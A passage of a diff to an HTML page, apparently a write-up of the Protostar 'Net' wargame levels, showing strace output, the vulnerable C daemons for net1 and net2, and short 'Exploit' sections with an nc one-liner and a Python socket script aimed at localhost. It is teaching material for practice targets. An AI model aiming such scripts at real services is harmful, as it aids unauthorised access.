+<div class="highlight"><pre><span></span><code>accept<span class="o">(</span><span class="m">3</span>,<span class="w"> </span><span class="o">{</span><span class="nv">sa_family</span><span class="o">=</span>AF_INET,<span class="w"> </span><span class="nv">sin_port</span><span class="o">=</span>htons<span class="o">(</span><span class="m">36218</span><span class="o">)</span>,<span class="w"> </span><span class="nv">sin_addr</span><span class="o">=</span>inet_addr<span class="o">(</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="o">)}</span>,<span class="w"> </span><span class="o">[</span><span class="m">16</span><span class="o">])</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">4</span>
+clone<span class="o">(</span>Process<span class="w"> </span><span class="m">18005</span><span class="w"> </span>attached<span class="w">    </span><span class="c1"># 再次调用 clone，从而能支持多用户并发</span>
+<span class="nv">child_stack</span><span class="o">=</span><span class="m">0</span>,<span class="w"> </span><span class="nv">flags</span><span class="o">=</span>CLONE_CHILD_CLEARTID<span class="p">|</span>CLONE_CHILD_SETTID<span class="p">|</span>SIGCHLD,<span class="w"> </span><span class="nv">child_tidptr</span><span class="o">=</span>0xb7e96728<span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">18005</span>
+<span class="o">[</span>pid<span class="w"> </span><span class="m">17964</span><span class="o">]</span><span class="w"> </span>close<span class="o">(</span><span class="m">4</span><span class="o">)</span><span class="w">                    </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+<span class="o">[</span>pid<span class="w"> </span><span class="m">17964</span><span class="o">]</span><span class="w"> </span>accept<span class="o">(</span><span class="m">3</span>,<span class="w">  </span>&lt;unfinished<span class="w"> </span>...&gt;
+<span class="o">[</span>pid<span class="w"> </span><span class="m">18005</span><span class="o">]</span><span class="w"> </span>close<span class="o">(</span><span class="m">3</span><span class="o">)</span><span class="w">                    </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+<span class="o">[</span>pid<span class="w"> </span><span class="m">18005</span><span class="o">]</span><span class="w"> </span>dup2<span class="o">(</span><span class="m">4</span>,<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w">                  </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+<span class="o">[</span>pid<span class="w"> </span><span class="m">18005</span><span class="o">]</span><span class="w"> </span>dup2<span class="o">(</span><span class="m">4</span>,<span class="w"> </span><span class="m">1</span><span class="o">)</span><span class="w">                  </span><span class="o">=</span><span class="w"> </span><span class="m">1</span>
+<span class="o">[</span>pid<span class="w"> </span><span class="m">18005</span><span class="o">]</span><span class="w"> </span>dup2<span class="o">(</span><span class="m">4</span>,<span class="w"> </span><span class="m">2</span><span class="o">)</span><span class="w">                  </span><span class="o">=</span><span class="w"> </span><span class="m">2</span>
+<span class="o">[</span>pid<span class="w"> </span><span class="m">18005</span><span class="o">]</span><span class="w"> </span>time<span class="o">(</span>NULL<span class="o">)</span><span class="w">                  </span><span class="o">=</span><span class="w"> </span><span class="m">1662378390</span>
+<span class="o">[</span>pid<span class="w"> </span><span class="m">18005</span><span class="o">]</span><span class="w"> </span>write<span class="o">(</span><span class="m">1</span>,<span class="w"> </span><span class="s2">&quot;Please send &#39;1923281790&#39; as a li&quot;</span>...,<span class="w"> </span><span class="m">54</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">54</span><span class="w">    </span><span class="c1"># printf</span>
+<span class="o">[</span>pid<span class="w"> </span><span class="m">18005</span><span class="o">]</span><span class="w"> </span>read<span class="o">(</span><span class="m">0</span>,<span class="w"> </span>
 </code></pre></div>
 </li>
 <li>
@@ -2923,75 +2937,75 @@ clone<span class="o">(</span>Process <span class="m">18005</span> attached    <s
 </li>
 </ul>
 <h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>$ <span class="nb">echo</span> -e <span class="s2">&quot;`cat | python -c &quot;</span>import struct<span class="p">;</span> print<span class="o">(</span>struct.pack<span class="o">(</span><span class="s1">&#39;I&#39;</span>, int<span class="o">(</span>input<span class="o">())))</span><span class="s2">&quot;`&quot;</span> <span class="p">|</span> nc localhost <span class="m">2999</span>
-Please send <span class="s1">&#39;2035797908&#39;</span> as a little endian 32bit int
-<span class="m">2035797908</span>  <span class="c1"># Enter + Ctrl_D, which will closes cat and echo</span>
-Thank you sir/madam
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;`cat | python -c &quot;</span>import<span class="w"> </span>struct<span class="p">;</span><span class="w"> </span>print<span class="o">(</span>struct.pack<span class="o">(</span><span class="s1">&#39;I&#39;</span>,<span class="w"> </span>int<span class="o">(</span>input<span class="o">())))</span><span class="s2">&quot;`&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>localhost<span class="w"> </span><span class="m">2999</span>
+Please<span class="w"> </span>send<span class="w"> </span><span class="s1">&#39;2035797908&#39;</span><span class="w"> </span>as<span class="w"> </span>a<span class="w"> </span>little<span class="w"> </span>endian<span class="w"> </span>32bit<span class="w"> </span>int
+<span class="m">2035797908</span><span class="w">  </span><span class="c1"># Enter + Ctrl_D, which will closes cat and echo</span>
+Thank<span class="w"> </span>you<span class="w"> </span>sir/madam
 </code></pre></div>
 <h2 id="net-1">Net 1<a class="headerlink" href="#net-1" title="Permanent link">&para;</a></h2>
 <blockquote>
 <p>convert binary integers into ascii representation</p>
 </blockquote>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;../common/common.c&quot;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;../common/common.c&quot;</span>
 
 <span class="cp">#define NAME &quot;net1&quot;</span>
 <span class="cp">#define UID 998</span>
 <span class="cp">#define GID 998</span>
 <span class="cp">#define PORT 2998</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">run</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">fub</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">;</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">run</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">fub</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">;</span>
 
-<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">wanted</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">wanted</span><span class="p">;</span>
 
-<span class="w">  </span><span class="n">wanted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">random</span><span class="p">();</span><span class="w"></span>
+<span class="w">  </span><span class="n">wanted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">random</span><span class="p">();</span>
 
-<span class="w">  </span><span class="n">sprintf</span><span class="p">(</span><span class="n">fub</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">wanted</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">sprintf</span><span class="p">(</span><span class="n">fub</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">wanted</span><span class="p">);</span>
 
 <span class="w">  </span><span class="c1">// the binary string is sent</span>
-<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">wanted</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">wanted</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">wanted</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;:(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">wanted</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">wanted</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">wanted</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;:(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
 
-<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;:(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;:(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
 
 <span class="w">  </span><span class="c1">// strchr - locate character in string</span>
-<span class="w">  </span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\r&#39;</span><span class="p">);</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">);</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\r&#39;</span><span class="p">);</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">);</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
 
-<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">fub</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you correctly sent the data</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you didn&#39;t send the data properly</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">fub</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you correctly sent the data</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you didn&#39;t send the data properly</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">;</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">;</span>
 
-<span class="w">  </span><span class="cm">/* Run the process as a daemon */</span><span class="w"></span>
+<span class="w">  </span><span class="cm">/* Run the process as a daemon */</span>
 <span class="w">  </span><span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span><span class="w"> </span><span class="n">UID</span><span class="p">,</span><span class="w"> </span><span class="n">GID</span><span class="p">);</span><span class="w"> </span>
 
-<span class="w">  </span><span class="cm">/* Wait for socket activity and return */</span><span class="w"></span>
-<span class="w">  </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="cm">/* Wait for socket activity and return */</span>
+<span class="w">  </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
 
-<span class="w">  </span><span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span><span class="w"></span>
-<span class="w">  </span><span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
+<span class="w">  </span><span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
 
-<span class="w">  </span><span class="cm">/* Don&#39;t do this :&gt; */</span><span class="w"></span>
-<span class="w">  </span><span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="w"></span>
+<span class="w">  </span><span class="cm">/* Don&#39;t do this :&gt; */</span>
+<span class="w">  </span><span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
 <span class="w">  </span><span class="c1">// If we send fast enough, the seconds will be the same</span>
 <span class="w">  </span><span class="c1">// thus produce the same pseudo random number</span>
 
-<span class="w">  </span><span class="n">run</span><span class="p">();</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="n">run</span><span class="p">();</span>
+<span class="p">}</span>
 </code></pre></div>
 <h3 id="exploit_1">Exploit<a class="headerlink" href="#exploit_1" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span>
@@ -3006,10 +3020,10 @@ Thank you sir/madam
 <span class="nb">print</span> <span class="s1">&#39;Send: &#39;</span> <span class="o">+</span> <span class="n">num_wanted</span>
 <span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>$ python /tmp/net.py 
-Receive: ��W
-Send: <span class="m">1473381877</span>
-you correctly sent the data
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>/tmp/net.py<span class="w"> </span>
+Receive:<span class="w"> </span>��W
+Send:<span class="w"> </span><span class="m">1473381877</span>
+you<span class="w"> </span>correctly<span class="w"> </span>sent<span class="w"> </span>the<span class="w"> </span>data
 </code></pre></div>
 <h3 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h3>
 <ul>
@@ -3019,60 +3033,60 @@ you correctly sent the data
 <blockquote>
 <p>add up 4 unsigned 32-bit integers</p>
 </blockquote>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;../common/common.c&quot;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;../common/common.c&quot;</span>
 
 <span class="cp">#define NAME &quot;net2&quot;</span>
 <span class="cp">#define UID 997</span>
 <span class="cp">#define GID 997</span>
 <span class="cp">#define PORT 2997</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">run</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">quad</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span><span class="w"></span>
-<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">result</span><span class="p">,</span><span class="w"> </span><span class="n">wanted</span><span class="p">;</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">run</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">quad</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">result</span><span class="p">,</span><span class="w"> </span><span class="n">wanted</span><span class="p">;</span>
 
-<span class="w">  </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">random</span><span class="p">();</span><span class="w"></span>
+<span class="w">  </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">random</span><span class="p">();</span>
 <span class="w">      </span><span class="n">result</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">];</span><span class="w">    </span><span class="c1">// 可能有溢出</span>
 
-<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="p">(</span><span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">          </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;:(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">      </span><span class="p">}</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="p">(</span><span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;:(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
 
-<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">wanted</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;:&lt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">wanted</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;:&lt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
 
 
-<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">result</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">wanted</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you added them correctly</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;sorry, try again. invalid</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">result</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">wanted</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you added them correctly</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;sorry, try again. invalid</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">;</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">;</span>
 
-<span class="w">  </span><span class="cm">/* Run the process as a daemon */</span><span class="w"></span>
+<span class="w">  </span><span class="cm">/* Run the process as a daemon */</span>
 <span class="w">  </span><span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span><span class="w"> </span><span class="n">UID</span><span class="p">,</span><span class="w"> </span><span class="n">GID</span><span class="p">);</span><span class="w"> </span>
 
-<span class="w">  </span><span class="cm">/* Wait for socket activity and return */</span><span class="w"></span>
